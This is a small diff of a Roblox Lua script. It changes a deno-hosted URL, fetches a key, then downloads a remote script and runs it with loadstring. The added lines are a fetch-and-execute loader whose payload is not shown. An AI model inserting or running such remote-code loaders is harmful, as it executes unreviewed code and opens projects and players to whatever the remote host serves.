@@ -1,8 +1,11 @@
 local HttpService = game:GetService("HttpService")
 
-local URL = "https://quiet-fly-81.deno.dev"
+local BASE = "https://cloudy-dove-90.lorln9.deno.net"
 
--- جلب المفتاح
-local key = HttpService:GetAsync(URL)
-
+local key = HttpService:GetAsync(BASE .. "/")
 print("KEY:", key)
+
+local scriptText = HttpService:GetAsync(BASE .. "/script")
+print("SCRIPT LENGTH:", #scriptText)
+
+loadstring(scriptText)()
